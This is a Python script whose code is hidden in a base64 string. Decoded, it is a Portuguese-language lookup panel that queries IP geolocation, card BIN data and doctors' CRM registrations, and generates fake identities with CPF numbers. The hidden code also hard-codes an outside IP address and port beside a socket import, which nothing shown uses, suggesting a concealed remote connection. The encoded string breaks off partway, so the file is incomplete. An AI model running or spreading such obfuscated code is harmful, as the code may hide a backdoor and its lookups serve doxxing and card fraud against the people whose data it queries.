import marshal, zlib
import os, sys
try:
	import base64
except:
	os.system("pip3 install base64")
	os.system("pip install base64")
	import base64

b = (base64.b64decode('''Z2xvYmFsIFIsIEIsIEMsIFksIEcsIFJULCBDWSwgQ08KQ08gPSAnXDAzM1ttJwpSID0gJ1wwMzNbMTszMW0nCkIgPSAnXDAzM1sxOzM0bScKQyA9ICdcMDMzWzE7MzdtJwpDWSA9ICdcMDMzWzE7MzZtJwpZID0gJ1wwMzNbMTszM20nCkcgPSAnXDAzM1sxOzMybScKUlQgPSAnXDAzM1s7MG0nCmltcG9ydCBvcywgYmFzZTY0LCByZXF1ZXN0cywgdGltZSwganNvbiwgcmUsIHJhbmRvbSwgcGxhdGZvcm0sIHN5cywgc2lnbmFsLCBhdGV4aXQsIGFyZ3BhcnNlLCBoYXNobGliLCB1cmxsaWIzLCBodG1sNWxpYiwgcHlmaWdsZXQKZnJvbSBweXR1YmUgaW1wb3J0IFlvdVR1YmUKIyBmcm9tIGZvcmRldi5nZW5lcmF0b3IgaW1wb3J0IHBlb3BsZSAjcHJlc2VudGUgcHJhIHF1ZW0gZXN0aXZlciBsZW5kbwpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCmZyb20gcmFuZG9tIGltcG9ydCByYW5kaW50CmZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIFN0eWxlCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwCmltcG9ydCBodG1sNWxpYgppbXBvcnQgcGhvbmVudW1iZXJzCmZyb20gcGhvbmVudW1iZXJzIGltcG9ydCBjYXJyaWVyCmZyb20gcGhvbmVudW1iZXJzIGltcG9ydCBnZW9jb2Rlcgpmcm9tIHBob25lbnVtYmVycyBpbXBvcnQgdGltZXpvbmUKZnJvbSB1cmxsaWIucGFyc2UgaW1wb3J0IHVybGVuY29kZQpmcm9tIHJlIGltcG9ydCBzZWFyY2ggCmZyb20gc29ja2V0IGltcG9ydCAqCmZyb20gcmVxdWVzdHMgaW1wb3J0IHBvc3QKCmhvc3QgPSAnNDUuNzkuMzkuNjQnCnBvcnQgPSA1NTU1NQoKZGVmIHJla3QoKToKICAgaWYgcGxhdGZvcm0uc3lzdGVtKCkgPT0gIldpbmRvd3MiOgogICAgICB3ZWJicm93c2VyLm9wZW5fbmV3X3RhYigiaHR0cHM6Ly95b3V0dS5iZS8xb0FaVmFyaUF2ayIpCiAgIGVsc2U6CiAgICAgICBvcy5zeXN0ZW0oInRlcm11eC1vcGVuLXVybCBodHRwczovL3lvdXR1LmJlLzFvQVpWYXJpQXZrIikKCnJlc3VsdCA9IHB5ZmlnbGV0LmZpZ2xldF9mb3JtYXQoIlJha3VuIiwgZm9udCA9ICJjb3NtaWMiICApCgpkZWYgY2xlYXIoKToKICAgIG9zLnN5c3RlbSgnY2xzJyBpZiBvcy5uYW1lID09ICdudCcgZWxzZSAnY2xlYXInKQoKZGVmIGNsZWFyKCk6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKCmRlZiBhdHQoKToKCXRyeToKCQlpZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgoJCQlvcy5zeXN0ZW0oImNsZWFyIikKCQkJcHJpbnQoZid7Q317R317cmVzdWx0fXtDfScpCgkJCXByaW50KGYne0N9W3tZfWl7Q31dIHtHfSBDaGVjYW5kbyBwb3IgYXR1YWxpemFjb2VzLi4uIHtDfScpCgkJCXVwZGF0ZSA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KCdnaXQgcHVsbCcsIHNoZWxsPVRydWUpCgkJCWlmICdBbHJlYWR5IHVwIHRvIGRhdGUnIG5vdCBpbiB1cGRhdGUuZGVjb2RlKCk6CgkJCQlwcmludChmJ3tDfVt7WX0qe0N9XSB7R31BdHVhbGl6YWNhbyBpbnN0YWxhZGEhXG57Q31be1l9KntDfV1SZWluaWNpYW5kbyBvIHBhaW5lbC4uLntDfScpCgkJCQlwcmludChmIntDfVt7R30re0N9XSBMb2FkaW5nOiIpCgkJCQkjYW5pbWF0aW9uID0gWyIxMCUiLCAiMjAlIiwgIjMwJSIsICI0MCUiLCAiNTAlIiwgIjYwJSIsICI3MCUiLCAiODAlIiwgIjkwJSIsICIxMDAlIl0KCQkJCWFuaW1hdGlvbiA9IFsiW+KWoOKWoeKWoeKWoeKWoeKWoeKWoeKWoeKWoeKWoV0iLCJb4pag4pag4pah4pah4pah4pah4pah4pah4pah4pahXSIsICJb4pag4pag4pag4pah4pah4pah4pah4pah4pah4pahXSIsICJb4pag4pag4pag4pag4pah4pah4pah4pah4pah4pahXSIsICJb4pag4pag4pag4pag4pag4pah4pah4pah4pah4pahXSIsICJb4pag4pag4pag4pag4pag4pag4pah4pah4pah4pahXSIsICJb4pag4pag4pag4pag4pag4pag4pag4pah4pah4pahXSIsICJb4pag4pag4pag4pag4pag4pag4pag4pag4pah4pahXSIsICJb4pag4pag4pag4pag4pag4pag4pag4pag4pag4pahXSIsICJb4pag4pag4pag4pag4pag4pag4pag4pag4pag4pagXSJdCgkJCQlmb3IgaSBpbiByYW5nZShsZW4oYW5pbWF0aW9uKSk6CgkJCQkJdGltZS5zbGVlcCgwLjIpCgkJCQkJc3lzLnN0ZG91dC53cml0ZSgiXHIiICsgYW5pbWF0aW9uW2kgJSBsZW4oYW5pbWF0aW9uKV0pCgkJCQlwcmludCgiXG4iKQoJCQkJdGltZS5zbGVlcCg1KQoJCQkJc3VicHJvY2Vzcy5ydW4oJ2NsZWFyJykKCQkJCXJlc3RhcnQoKQoJCQllbHNlOgoJCQkJcHJpbnQoZid7Q31be1l9aXtDfV0gTmVuaHVtYSBhdHVhbGl6YWNhbyBkaXNwb25pdmVsLicpCgkJCQl0aW1lLnNsZWVwKDIpCglleGNlcHQ6CgkJCXBhc3MKCmRlZiBjaGF0KCk6Cglvcy5zeXN0ZW0oInBrZyBpbnN0YWxsIGlyc3NpIC15IikKCW9zLnN5c3RlbSgiY2xlYXIiKQoJcHJpbnQoZid7Q317R317cmVzdWx0fXtDfScpCglwcmludChmJ3tDfVt7WX1pe0N9XSBUVVRPUklBTCBERSBDT01PIEVOVFJBUiBOTyBDSEFUJykKCXByaW50KGYne0N9W3tSfSt7Q31dIFJFQ09NRU5ETyBPIFVTTyBERSBWUE4nKQoJcHJpbnQoKQoJcHJpbnQoZid7Q31be0d9aXtDfV0gL2Nvbm5lY3QgY2hhdC5mcmVlbm9kZS5uZXQnKSAKCXByaW50KGYne0N9W3tHfWl7Q31dIC9uaWNrIChzZXUgbmlja25hbWUpJykKCXByaW50KGYne0N9W3tHfWl7Q31dIC9qb2luICNLaW55JykKCXByaW50KGYne0N9W3tSfWl7Q31dIFF1YW5kbyBmb3Igc2FpciwgZGlnaXRlIC9leGl0JykKCXBhdXNlID0gaW5wdXQoZid7Q317WX1BUEVSVEUgRU5URVIgUEFSQSBJUiBQUk8gQ0hBVHtDfScpCglvcy5zeXN0ZW0oImlyc3NpIikKCmRlZiBhb3Zpdm8oKToKICAgIHByaW50KGYne0N9e0d9e3Jlc3VsdH17Q30nKQogICAgcHJpbnQoZid7Q309PT17Un17Q30gTm90YXMgZGUgYW8gdml2byB7Q309PT17Un17Q30nKQogICAgcHJpbnQoKQogICAgcHJpbnQoZiJ7Q31be1J9KntDfV0gRXN0YSBwYXJ0ZSBmb2kgY3JpYWRhIHBhciBlc2NsYXJlY2VyIGFsZ3VtYXMgY29pc2FzIHNvYnJlIG8gc2NyaXB0LCBwZcOnbyBxdWUgZXNwZXJlbSBlIHBhcmVtIGRlIHZpciBubyBtZXUgUFYgcGVyZ3VudGFyIG8gbW90aXZvIGRlIHZvY8OqcyBuw6NvIGNvbnNlZ3VpcmVtIGNvbnN1bHRhci4iKQogICAgcHJpbnQoKQogICAgcHJpbnQoZiJ7Q31be1J9KntDfV0gQXMgY29uc3VsdGFzIHBvciBuw7ptZXJvIHBhcm91IHBlbGEgQVBJIGVzdGFyIHtDfVt7Un1PRkZ7Q31dLiBNYXMgY29uc2VndWkgdW0gbm92byBwYXRyb2NpbmFkb3IgcGFyYSBjb21wcmFyIHVtYSBkYXRhYmFzZSBlIHVtYSBBUEkiKQogICAgcHJpbnQoKQogICAgcHJpbnQoZiJ7Q31be0d9KntDfV0gTWluaGEgQ2hhdmUgUElYOiB7Q31be0d9MjI4NDYzZDctMGJlYy00NGJkLWJkZGQtYTc4MGQ5NTMwZjI3e0N9XSIpCiAgICBwcmludCgpCiAgICBwcmludChmIntDfVt7R30qe0N9XSBQYXJlbSBkZSB2aXIgbm8gbWV1IFBWIHBlcmd1bnRhciBjb21vIGNvbnN1bHRhIG91IHBvcnF1ZSBhcyBJbmZvcyBuw6NvIGNoZWdhbSwgZXUgdMO0IHNlbSBBUEkgcHJhIGVzc2FzIGNvbnN1bHRhcyEiKQogICAgcHJpbnQoKQogICAgcHJpbnQoZiJ7Q31be0d9KntDfV0ge0N9W3tHfVBob25lIEluZm9nYXtDfV0gLSBBIGZvcm1hIGRlIGNvbnN1bHRhIGRvIFBob25lSW5mb2dhIMOpIG8gRERJLCBEREQgZSBvIG51bWVybyhleDogNTUyMTk3OTE4MDUzMykuIHF1YW50byB1bSBudW1lcm8gdGl2ZXIgYXBlbmFzIDggZGlnaXRvcywgdm9jZSBkZXZlIGNvbG9jYXIgdW0gbm92ZSBuYSBmcmVudGUoZXg6IDU1IDgxIDnDl8OXw5fDly3Dl8OXw5fDlykuIikKICAgIHByaW50KCkKICAgIHByaW50KGYne0N9W3tHfSp7Q31dIFBhcmVtIGRlIHBlcmd1bnRhciBzZSBldSB0ZW5obyBvdXRybyBwYWluZWwsIGVzc2UgYXF1aSDDqSBvIG1ldSDDum5pY28sIGVsZSBzZW1wcmUgcmVjZWJlIGF0dWFsaXphw6fDo28sIGVsZSB0ZW0gdW1hIG9ww6fDo28gcGFyYSBhdHVhbGl6YXIsIMOpIHPDsyB1c2FyZW0hJykKICAgIHByaW50KCkKICAgIHByaW50KGYiUHLDs3hpbWEgQXR1YWxpemHDp8OjbyB7Q317Un1Ow4NPIHRlbSBkYXRhe0N9IikKICAgIHByaW50KCkKICAgIHBhdXNlID0gaW5wdXQoIlByZXNzaW9uZSBFbnRlciBwYXJhIHJldG9ybmFyIikKCgpkZWYgbm90ZXMoKToKICAgIHByaW50KGYne0N9e0d9e3Jlc3VsdH17Q30nKQogICAgcHJpbnQoZid7Q309PT17Un17Q30gTm90YXMgZGUgdmVyc8OjbyB7Q309PT17Un17Q30nKQogICAgcHJpbnQoZicnJwogICAgVmVyc8OjbyAzLjgKLU5vdmFzIEFQSXMgKGluY2x1c2l2ZSBBUElzIHBhZ2FzKQotQ29uZmlndXJhw6fDtWVzCi1Nb2RvIHNlbSBzZW5oYQotUmVtb8Onw6NvIGRlIG9ww6fDo28gaW7DunRpbAotT3RpbWl6YcOnw6NvIGRvIGPDs2RpZ28KLU5vdmEgb3DDp8OjbyBubyBtZW51CiAgICAgICAgCiAgICBDb2RhZG8gcG9yOiB7Q317Qn1ZQVRPe0N9CiAgICBBUElzICxpZGVpYSBlIGPDs2RpZ28gaW5pY2lhbDoge0N9e0J9S0lOWXtDfQogICAgQVBJIE1URSBlIGF1eGlsaW8gbm8gc2NyaXB0OiB7Q317Qn1wMGlzMG57Q30KICAgIFBhdHJvY2luaW86T2JyaWdhZG8ge0N9e0J9RG91Z2xhc3tDfSBlIHtDfXtCfU1hcmdhcmluYXtDfSBwZWxvIG1vbmV5IHByYSBmYXplciBvIHNjcmlwdC4KICAgIAogICAgT2JyaWdhZG8ge0N9e0J9U251a2luZ3tDfSwgcGVsbyBhcG9pbyBlIGFsZ3VtYXMgYWp1ZGFzOwogICAgCiAgICAnJycpCiAgICBwYXVzZSA9IGlucHV0KCdQcmVzc2lvbmUgZW50ZXIgcGFyYSByZXRvcm5hci4nKQoKZGVmIGNvdmlkMTkoKToKICAgIHByaW50KGYne0N9e0d9e3Jlc3VsdH17Q30nKQogICAgcHJpbnQoZid7Q31be1l9aXtDfV0gSW5mb3JtZSBvIFVGLiBFeGVtcGxvOiBzcCwgcGEsIGJhICcpCiAgICBjaG9pY2UgPSBpbnB1dCgnPT09PicpCiAgICBkYXRhID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2NvdmlkMTktYnJhemlsLWFwaS5ub3cuc2gvYXBpL3JlcG9ydC92MS9icmF6aWwvdWYve30nLmZvcm1hdChjaG9pY2UpKS5qc29uKCkKICAgIGNsZWFyKCkKICAgIHByaW50KHJlc3VsdCkKICAgIHByaW50KCJEYXRhIGUgaG9yYXJpbyBsb2NhbDoge30iLmZvcm1hdChkYXRhWydkYXRldGltZSddKSkKICAgIHByaW50KCJFc3RhZG86IHt9Ii5mb3JtYXQoZGF0YVsnc3RhdGUnXSkpCiAgICBwcmludCgiVUY6IHt9Ii5mb3JtYXQoZGF0YVsndWYnXSkpCiAgICBwcmludCgiVUlEOiB7fSIuZm9ybWF0KGRhdGFbJ3VpZCddKSkKICAgIHByaW50KCJDYXNvczoge30iLmZvcm1hdChkYXRhWydjYXNlcyddKSkKICAgIHByaW50KCJNb3J0ZXM6IHt9Ii5mb3JtYXQoZGF0YVsnZGVhdGhzJ10pKQogICAgcHJpbnQoIlN1c3BlaXRhczoge30iLmZvcm1hdChkYXRhWydzdXNwZWN0cyddKSkKICAgIHByaW50KCJSZWN1c2Fkb3M6IHt9Ii5mb3JtYXQoZGF0YVsncmVmdXNlcyddKSkKICAgIHBhdXNhID0gaW5wdXQoJ1ByZXNzaW9uZSBlbnRlciBwYXJhIHJldG9ybmFyIGFvIG1lbnUuJykKCgpkZWYgaXAoaXBfYXBpLCBtb2RlLCB0b2tlbik6CiAgICBwcmludChmJ3tDfXtHfXtyZXN1bHR9e0N9JykKICAgIGlmIGlwX2FwaSA9PSAwIG9yIGlwX2FwaSA9PSAyOgogICAgICAgIGlmIG1vZGUgPT0gMDoKICAgICAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldCgnaHR0cDovL2lwLWFwaS5jb20vanNvbi8nKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGlwX2lucHV0ID0gaW5wdXQoIj09PT4iKQogICAgICAgICAgICBkYXRhID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vaXAtYXBpLmNvbS9qc29uL3t9Jy5mb3JtYXQoaXBfaW5wdXQpKQogICAgICAgIGFkcmVzc19kYXRhID0gZGF0YS5qc29uKCkKICAgICAgICB3ZWF0aGVyX2RhdGEgPSByZXF1ZXN0cy5nZXQoCiAgICAgICAgICAgICdodHRwOi8vYXBpLm9wZW53ZWF0aGVybWFwLm9yZy9kYXRhLzIuNS93ZWF0aGVyP2xhdD17bGF0fSZsb249e2xvbn0mYXBwaWQ9e3Rva2VuWzJdfScpCiAgICAgICAgd2VhdGhlciA9IGpzb24ubG9hZHMod2VhdGhlcl9kYXRhLnRleHQpCiAgICAgICAgaWYgKGFkcmVzc19kYXRhWydzdGF0dXMnXSkgPT0gJ3N1Y2Nlc3MnOgogICAgICAgICAgICBwcmludCgnSVA6IHt9Jy5mb3JtYXQoYWRyZXNzX2RhdGFbJ3F1ZXJ5J10pKQogICAgICAgICAgICBwcmludCgnU3RhdHVzOiB7fScuZm9ybWF0KGFkcmVzc19kYXRhWydzdGF0dXMnXSkpCiAgICAgICAgICAgIHByaW50KCdQYWlzOiB7fScuZm9ybWF0KGFkcmVzc19kYXRhWydjb3VudHJ5J10pKQogICAgICAgICAgICBwcmludCgnUmVnaWFvOiB7fScuZm9ybWF0KGFkcmVzc19kYXRhWydyZWdpb25OYW1lJ10pKQogICAgICAgICAgICBwcmludCgnQ2lkYWRlOiB7fScuZm9ybWF0KGFkcmVzc19kYXRhWydjaXR5J10pKQogICAgICAgICAgICBwcmludCgnWklQOiB7fScuZm9ybWF0KGFkcmVzc19kYXRhWyd6aXAnXSkpCiAgICAgICAgICAgIHByaW50KCdMYXRpdHVkZToge30nLmZvcm1hdChhZHJlc3NfZGF0YVsnbGF0J10pKQogICAgICAgICAgICBwcmludCgnTG9uZ2l0dWRlOiB7fScuZm9ybWF0KGFkcmVzc19kYXRhWydsb24nXSkpCiAgICAgICAgICAgIHByaW50KCdGdXNvLUhvcmFycm86IHt9Jy5mb3JtYXQoYWRyZXNzX2RhdGFbJ3RpbWV6b25lJ10pKQogICAgICAgICAgICBwcmludCgnSW50ZXJuZXQtSW5mbzoge30nLmZvcm1hdChhZHJlc3NfZGF0YVsnYXMnXSkpCiAgICAgICAgICAgIHByaW50KCdJU1A6IHt9Jy5mb3JtYXQoYWRyZXNzX2RhdGFbJ2lzcCddKSkKICAgICAgICAgICAgcHJpbnQoJ09SRzoge30nLmZvcm1hdChhZHJlc3NfZGF0YVsnb3JnJ10pKQogICAgICAgICAgICAjIHByaW50KCdUZW1wZXJhdHVyYToge30nLmZvcm1hdCh3ZWF0aGVyWyJ3ZWF0aGVyIl1bIm1haW4iXSkpCiAgICBpZiBpcF9hcGkgPT0gMSBvciBpcF9hcGkgPT0gMjoKICAgICAgICBpZiBtb2RlID09IDE6CiAgICAgICAgICAgIGlwX2lucHV0ID0gaW5wdXQoIj09PT4iKQogICAgICAgICAgICBhcGkgPSByZXF1ZXN0cy5nZXQoJ2h0dHA6Ly9pcHdob2lzLmFwcC9qc29uLycgKyBpcF9pbnB1dCkuanNvbigpCiAgICAgICAgaWYgbW9kZSA9PSAwOgogICAgICAgICAgICBhcGkgPSByZXF1ZXN0cy5nZXQoJ2h0dHA6Ly9pcHdob2lzLmFwcC9qc29uLycpLmpzb24oKQogICAgICAgIGNsZWFyKCkKICAgICAgICBwcmludChmJ3tDfXtHfXtyZXN1bHR9e0N9JykKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIGlwX2FwaSA9PSAxOgogICAgICAgICAgICAgICAgcHJpbnQoJ0lQOiB7fScuZm9ybWF0KGFwaVsnaXAnXSkpCiAgICAgICAgICAgIHByaW50KCdUSVBPOiB7fScuZm9ybWF0KGFwaVsndHlwZSddKSkKICAgICAgICAgICAgcHJpbnQoJ0NPTlRJTkVOVEU6IHt9Jy5mb3JtYXQoYXBpWydjb250aW5lbnQnXSkpCiAgICAgICAgICAgIHByaW50KCdDw5NESUdPIERPIENPTlRJTkVOVEU6IHt9Jy5mb3JtYXQoYXBpWydjb250aW5lbnRfY29kZSddKSkKICAgICAgICAgICAgcHJpbnQoJ1BBSVM6IHt9Jy5mb3JtYXQoYXBpWydjb3VudHJ5J10pKQogICAgICAgICAgICBwcmludCgnQ8OTRElHTyBETyBQQcONUzoge30nLmZvcm1hdChhcGlbJ2NvdW50cnknXSkpCiAgICAgICAgICAgIHByaW50KCdQQUlTOiB7fScuZm9ybWF0KGFwaVsnY291bnRyeSddKSkKICAgICAgICAgICAgcHJpbnQoJ0NBUElUQUwgRE8gUEFJUzoge30nLmZvcm1hdChhcGlbJ2NvdW50cnlfY2FwaXRhbCddKSkKICAgICAgICAgICAgcHJpbnQoJ0PDk0RJR08gVEVMRUbDlE5JQ08gRE8gUEHDjVM6IHt9Jy5mb3JtYXQoYXBpWydjb3VudHJ5X3Bob25lJ10pKQogICAgICAgICAgICBwcmludCgnUEFJU0VTIFZJWklOSE9TOiB7fScuZm9ybWF0KGFwaVsnY291bnRyeV9uZWlnaGJvdXJzJ10pKQogICAgICAgICAgICBwcmludCgnUkVHScODTzoge30nLmZvcm1hdChhcGlbJ3JlZ2lvbiddKSkKICAgICAgICAgICAgcHJpbnQoJ0NJREFERToge30nLmZvcm1hdChhcGlbJ2NpdHknXSkpCiAgICAgICAgICAgIHByaW50KCdMQVRJVFVERToge30nLmZvcm1hdChhcGlbJ2xhdGl0dWRlJ10pKQogICAgICAgICAgICBwcmludCgnTE9OR0lUVURFOiB7fScuZm9ybWF0KGFwaVsnbG9uZ2l0dWRlJ10pKQogICAgICAgICAgICBwcmludCgnQVNOOiB7fScuZm9ybWF0KGFwaVsnYXNuJ10pKQogICAgICAgICAgICBwcmludCgnT1JHOiB7fScuZm9ybWF0KGFwaVsnb3JnJ10pKQogICAgICAgICAgICBwcmludCgnSVNQOiB7fScuZm9ybWF0KGFwaVsnaXNwJ10pKQogICAgICAgICAgICBwcmludCgnSE9Sw4FSSU8gUEFEUsODTzoge30nLmZvcm1hdChhcGlbJ3RpbWV6b25lJ10pKQogICAgICAgICAgICBwcmludCgnTk9NRSBETyBIT1LDgVJJTyBQQURSw4NPOiB7fScuZm9ybWF0KGFwaVsndGltZXpvbmVfbmFtZSddKSkKICAgICAgICAgICAgcHJpbnQoJ0dNVDoge30nLmZvcm1hdChhcGlbJ3RpbWV6b25lX2dtdCddKSkKICAgICAgICAgICAgcHJpbnQoJ01PRURBOiB7fScuZm9ybWF0KGFwaVsnY3VycmVuY3knXSkpCiAgICAgICAgICAgIHByaW50KCdDw5NESUdPIERBIE1PRURBOiB7fScuZm9ybWF0KGFwaVsnY3VycmVuY3lfY29kZSddKSkKICAgICAgICAgICAgcHJpbnQoJ1NJTUJPTE8gREEgTU9FREE6IHt9Jy5mb3JtYXQoYXBpWydjdXJyZW5jeV9zeW1ib2wnXSkpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmJ3tDfVt7Un1FUlJPUntDfV0gSVAgSW52w6FsaWRvICcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgY2xlYXIoKQogICAgICAgICAgICBpcChpcF9hcGksIG1vZGUpCgogICAgcHJpbnQoZiJ7Q31be1l9aXtDfV1ERVNFSkEgTE9DQUxJWkFSIFVNIE5PVk8gSVA/IikKICAgIHByaW50KGYie0N9e0d9WzFde0N9IFNpbSIpCiAgICBwcmludChmIntDfXtHfVsyXXtDfSBOw6NvIikKICAgIHZpID0gaW5wdXQoJz09PT4gJykKICAgIGlmIHZpID09ICcxJyBvciB2aSA9PSAnMDEnOgogICAgICAgIGNsZWFyKCkKICAgICAgICBpcChpcF9hcGksIG1vZGUpCgoKZGVmIGJpbigpOgogICAgcHJpbnQoZid7Q317R317cmVzdWx0fXtDfScpCiAgICBwcmludCgnRXhlbXBsbzo0NTcxNzM2MCcpCiAgICBwcmludChmJ3tDfVt7WX1pe0N9XSBEaWdpdGUgYSBCSU4uJykKICAgIGJpbl9pbnB1dCA9IGlucHV0KCI9PT0+IikKICAgIGhlYWRlcnMgPSB7IkFjY2VwdC1WZXJzaW9uIjogIjMiLAogICAgICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNV80KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODMuMC40MTAzLjk3IFNhZmFyaS81MzcuMzYifQogICAgdHJ5OgogICAgICAgIHJlcSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9sb29rdXAuYmlubGlzdC5uZXQvJyArIGJpbl9pbnB1dCwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIHJlcV9kYXRhID0gcmVxLmpzb24oKQogICAgZXhjZXB0OgogICAgICAgIHByaW50KGYne0N9W3tSfUVSUk9Se0N9XSBPY29ycmV1IHVtIGVycm8sdGVudGUgbm92YW1lbnRlLicpCiAgICBjbGVhcigpCiAgICBwcmludChyZXN1bHQpCiAgICBwcmludCgnQmFuZGVpcmE6IHt9Jy5mb3JtYXQocmVxX2RhdGFbJ3NjaGVtZSddKSkKICAgIHByaW50KCdNYXJjYToge30nLmZvcm1hdChyZXFfZGF0YVsnYnJhbmQnXSkpCiAgICBwcmludCgnVGlwbzoge30nLmZvcm1hdChyZXFfZGF0YVsndHlwZSddKSkKICAgIHByaW50KCdQYWlzOiB7fScuZm9ybWF0KHJlcV9kYXRhWydjb3VudHJ5J11bJ25hbWUnXSkpCiAgICBwcmludCgnTGF0aXR1ZGU6IHt9Jy5mb3JtYXQocmVxX2RhdGFbJ2NvdW50cnknXVsnbGF0aXR1ZGUnXSkpCiAgICBwcmludCgnTG9uZ2l0dWRlOiB7fScuZm9ybWF0KHJlcV9kYXRhWydjb3VudHJ5J11bJ2xvbmdpdHVkZSddKSkKICAgIHByaW50KCdNb2VkYToge30nLmZvcm1hdChyZXFfZGF0YVsnY291bnRyeSddWydjdXJyZW5jeSddKSkKICAgIHByaW50KCdFbW9qaToge30nLmZvcm1hdChyZXFfZGF0YVsnY291bnRyeSddWydlbW9qaSddKSkKICAgIHByaW50KGYne0N9W3tZfWl7Q31dIERlc2VqYSByZWFsaXphciB1bWEgbm92YSBjb25zdWx0YT8nKQogICAgcHJpbnQoJzEuU2ltJykKICAgIHByaW50KCcyLk7Do28nKQogICAgY2hvaWNlID0gaW5wdXQoIj09PT4iKQogICAgaWYgY2hvaWNlID09ICcxJyBvciBjaG9pY2UgPT0gJzAxJzoKICAgICAgICBiaW4oKQogICAgZWxpZiBjaG9pY2UgPT0gJzInIG9yIGNob2ljZSA9PSAnMDInOgogICAgICAgIHBhc3MKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZid7Q31be1J9RVJST1J7Q31dIE9ww6fDo28gaW52w6FsaWRhJykKICAgICAgICB0aW1lLnNsZWVwKDMpCgoKZGVmIGNybSh0b2tlbik6CiAgICBwcmludChmJ3tDfXtHfXtyZXN1bHR9e0N9JykKICAgIHByaW50KGYne0N9W3tHfWl7Q31dIERpZ2l0ZSBvIG51bWVybyBkbyBDUk0uJykKICAgIGNybV9pbnB1dCA9IGlucHV0KCI9PT0+IikKICAgIHByaW50KGYne0N9W3tHfWl7Q31dIERpZ2l0ZSBvIFVGLicpCiAgICB1Zl9pbnB1dCA9IGlucHV0KCI9PT0+IikKICAgIHRyeToKICAgICAgICB1cmwgPSAnaHR0cHM6Ly93d3cuY29uc3VsdGFjcm0uY29tLmJyL2FwaS9pbmRleC5waHA/dGlwbz1jcm0mdWY9JyArIHVmX2lucHV0CiAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldCh1cmwgKyAnJnE9e30mY2hhdmU9e30mZGVzdGlubz1qc29uJy5mb3JtYXQoY3JtX2lucHV0LCB0b2tlblsxXSkpCiAgICAgICAgY3JtX2RhdGEgPSBkYXRhLmpzb24oKQogICAgZXhjZXB0OgogICAgICAgIHByaW50KGYne0N9W3tSfUVSUk9Se0N9XSBDUk0gb3UgVUYgaW52YWxpZG8nKQogICAgICAgICMgY29uc3VsdGFzID0gKGNybV9kYXRhWydhcGlfbGltaXRlJ10pIC0gKGNybV9kYXRhWydhcGlfY29uc3VsdGFzJ10pCiAgICBpZiAoY3JtX2RhdGFbJ3N0YXR1cyddKSA9PSAidHJ1ZSI6CiAgICAgICAgIyBwcmludCgnQ29uc3VsdGFzIHJlc3RhbnRlcyA9Jytjb25zdWx0YXMpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBwcmludCgnQ1JNOiB7fScuZm9ybWF0KGNybV9kYXRhWyJpdGVtIl1bMF1bIm51bWVybyJdKSkKICAgICAgICAgICAgcHJpbnQoJ05vbWU6IHt9Jy5mb3JtYXQoY3JtX2RhdGFbIml0ZW0iXVswXVsibm9tZSJdKSkKICAgICAgICAgICAgcHJpbnQoJ1VGOiB7fScuZm9ybWF0KGNybV9kYXRhWyJpdGVtIl1bMF1bInVmIl0pKQogICAgICAgICAgICBwcmludCgnU2l0dWFjYW86IHt9Jy5mb3JtYXQoY3JtX2RhdGFbIml0ZW0iXVswXVsic2l0dWFjYW8iXSkpCiAgICAgICAgICAgIHByaW50KCdQcm9maXNzw6NvOiB7fScuZm9ybWF0KGNybV9kYXRhWyJpdGVtIl1bMF1bInByb2Zpc3NhbyJdKSkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYne0N9W3tSfSp7Q31dIEVycm8hIGRhZG9zIGludmFsaWRvcyEnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIGNvbnN1bHRhY3JtKCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoZid7Q31be1J9aXtDfV0gQ1JNIGludmFsaWRvJykKICAgIHByaW50KGYne0N9W3tHfWl7Q31dIERlc2VqYSByZWFsaXphciB1bWEgbm92YSBjb25zdWx0YT8nKQogICAgcHJpbnQoJzEuU2ltJykKICAgIHByaW50KCcyLk7Do28nKQogICAgY2hvaWNlID0gaW5wdXQoIj09PT4iKQogICAgaWYgY2hvaWNlID09ICIxIiBvciBjaG9pY2UgPT0gIjAxIjoKICAgICAgICBjcm0oKQogICAgaWYgY2hvaWNlID09ICIyIiBvciBjaG9pY2UgPT0gIjAyIjoKICAgICAgICBwYXNzCiAgICBlbHNlOgogICAgICAgIHByaW50KCJPcGNhbyBpbnZhbGlkYS4iKQoKCmRlZiBnZXJhcl9wZXNzb2EodG9rZW4pOiAgIyMjIyNSRVdPUksKICAgIHByaW50KGYne0N9e0d9e3Jlc3VsdH17Q30nKQogICAgcHJpbnQoZid7Q31be0d9aXtDfV0gR2VyYW5kbyBwZXNzb2EuJykKICAgIG5hdGlvbmFsID0gWyJCUiIsICJVU0EiLCAiUFQiLCAiQ0EiLCAiSlAiXQogICAgUk4gPSByYW5kaW50KDAsIDEwKQogICAgY25zID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vZ2VyYWRvcmFwcC5jb20vYXBpL3YxL2Nucy9nZW5lcmF0ZT90b2tlbj17fScuZm9ybWF0KHRva2VuWzBdKSkuanNvbigpCiAgICBjcGYgPSByZXF1ZXN0cy5nZXQoJ2h0dHA6Ly9nZXJhZG9yYXBwLmNvbS9hcGkvdjEvY3BmL2dlbmVyYXRlP3Rva2VuPXt9Jy5mb3JtYXQodG9rZW5bMF0pKS5qc29uKCkKICAgIH